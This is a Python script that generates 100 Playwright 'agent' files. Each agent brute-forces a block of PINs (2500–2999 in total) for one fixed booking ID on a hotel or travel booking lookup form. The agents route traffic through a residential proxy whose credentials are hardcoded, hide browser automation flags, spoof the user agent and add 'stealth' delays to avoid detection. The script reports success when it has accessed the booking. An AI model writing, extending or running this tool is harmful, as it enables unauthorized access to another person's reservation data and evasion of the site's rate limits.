import os
from colorama import init, Fore, Style
init()

print(f"{Fore.CYAN}🚀 BATCH D ARMY GENERATOR 🚀{Style.RESET_ALL}")
print(f"{Fore.YELLOW}Creating 100 agents: 1D → 100D{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}Booking ID: 6339614781{Style.RESET_ALL}")
print(f"{Fore.GREEN}Sequential PIN Coverage: 2500-2999{Style.RESET_ALL}")
print(f"{Fore.BLUE}Proxy: https://us-pr.oxylabs.io:10000{Style.RESET_ALL}")
print(f"{Fore.RED}🎯 BEGINNING BATCH D CREATION!{Style.RESET_ALL}")

# Generate 100 agents with sequential PIN ranges
print(f"{Fore.CYAN}🎲 Generating sequential PIN ranges...{Style.RESET_ALL}")

for i in range(1, 101):
    agent_id = f"{i:03d}D"
    
    # Calculate PIN range for this agent (5 PINs each)
    start_pin = 2500 + (i - 1) * 5
    pin_list = [str(start_pin + j) for j in range(5)]
    
    print(f"{Fore.YELLOW}🔧 Creating Agent {agent_id} ({i}/100)...{Style.RESET_ALL}")
    
    # Generate the agent script
    agent_code = f'''import asyncio
import random
from colorama import init, Fore, Style
from playwright.async_api import async_playwright
init()

class Agent{agent_id}:
    def __init__(self):
        self.agent_id = "{agent_id}"
        self.booking_id = "6339614781"
        self.pin_list = {pin_list}
        self.proxy_server = "https://us-pr.oxylabs.io:10000"
        self.proxy_username = "customer-oxy1p_hnzsA"
        self.proxy_password = "oxy1p_hnzsA1"
        
    async def test_pins(self):
        print(f"{{Fore.CYAN}}🚀 Agent {{self.agent_id}} Starting Mission{{Style.RESET_ALL}}")
        print(f"{{Fore.YELLOW}}📋 Booking ID: {{self.booking_id}}{{Style.RESET_ALL}}")
        print(f"{{Fore.MAGENTA}}🔢 Testing PINs: {{', '.join(self.pin_list)}}{{Style.RESET_ALL}}")
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                proxy={{
                    "server": self.proxy_server,
                    "username": self.proxy_username,
                    "password": self.proxy_password
                }},
                headless=True,
                args=["--disable-blink-features=AutomationControlled"]
            )
            
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            
            page = await context.new_page()
            
            for pin in self.pin_list:
                try:
                    print(f"{{Fore.BLUE}}🎯 Testing PIN: {{pin}}{{Style.RESET_ALL}}")
                    
                    # Navigate to booking lookup
                    await page.goto("https://www.ghostform.com/search", wait_until="networkidle")
                    await asyncio.sleep(random.uniform(2, 4))
                    
                    # Fill booking ID
                    booking_field = await page.wait_for_selector('input[name="booking_id"]')
                    await booking_field.fill(self.booking_id)
                    await asyncio.sleep(random.uniform(1, 2))
                    
                    # Fill PIN
                    pin_field = await page.wait_for_selector('input[name="pin"]')
                    await pin_field.fill(pin)
                    await asyncio.sleep(random.uniform(1, 2))
                    
                    # Submit form
                    submit_btn = await page.wait_for_selector('input[type="submit"]')
                    await submit_btn.click()
                    
                    # Wait for page to load completely
                    await page.wait_for_load_state("networkidle")
                    await asyncio.sleep(random.uniform(3, 5))
                    
                    # Check if we found valid booking
                    result = await page.evaluate("""
                        () => {{
                            const bodyText = document.body.innerText.toLowerCase();
                            if (bodyText.includes('booking found') || 
                                bodyText.includes('reservation details') ||
                                bodyText.includes('booking details') ||
                                bodyText.includes('confirmed') ||
                                document.querySelector('.booking-details') ||
                                document.querySelector('.reservation-info')) {{
                                return 'SUCCESS';
                            }} else if (bodyText.includes('not found') || 
                                      bodyText.includes('invalid') ||
                                      bodyText.includes('error')) {{
                                return 'FAIL';
                            }}
                            return 'UNKNOWN';
                        }}
                    """)
                    
                    if result == 'SUCCESS':
                        print(f"{{Fore.GREEN}}✅ SUCCESS! Agent {{self.agent_id}} found valid PIN: {{pin}}{{Style.RESET_ALL}}")
                        print(f"{{Fore.GREEN}}🎉 Booking {{self.booking_id}} accessed with PIN {{pin}}!{{Style.RESET_ALL}}")
                        await browser.close()
                        return pin
                    elif result == 'FAIL':
                        print(f"{{Fore.RED}}❌ Invalid PIN: {{pin}}{{Style.RESET_ALL}}")
                    else:
                        print(f"{{Fore.YELLOW}}⚠️ Unclear result for PIN: {{pin}}{{Style.RESET_ALL}}")
                    
                except Exception as e:
                    print(f"{{Fore.RED}}💥 Error testing PIN {{pin}}: {{str(e)}}{{Style.RESET_ALL}}")
                
                # Stealth delay between attempts
                await asyncio.sleep(random.uniform(3, 7))
            
            await browser.close()
            print(f"{{Fore.CYAN}}🔄 Agent {{self.agent_id}} completed mission - no valid PINs found{{Style.RESET_ALL}}")
            return None

async def main():
    agent = Agent{agent_id}()
    await agent.test_pins()

if __name__ == "__main__":
    asyncio.run(main())
'''
    
    # Write agent file
    with open(f"agent_{agent_id}.py", "w", encoding='utf-8') as f:
        f.write(agent_code)
    
    print(f"{Fore.GREEN}✅ Created: agent_{agent_id}.py{Style.RESET_ALL}")

print(f"{Fore.GREEN}🎉 BATCH D CREATION COMPLETE!{Style.RESET_ALL}")
print(f"{Fore.CYAN}📂 Files Created: 100 agents{Style.RESET_ALL}")
print(f"{Fore.YELLOW}📊 PIN Coverage: 2500-2999 (500 total PINs){Style.RESET_ALL}")
print(f"{Fore.MAGENTA}🎯 Target: 6339614781{Style.RESET_ALL}")
print(f"{Fore.GREEN}✅ BATCH D READY FOR DEPLOYMENT!{Style.RESET_ALL}")
print(f"{Fore.RED}🏆 400-AGENT ARMY COMPLETE!{Style.RESET_ALL}")
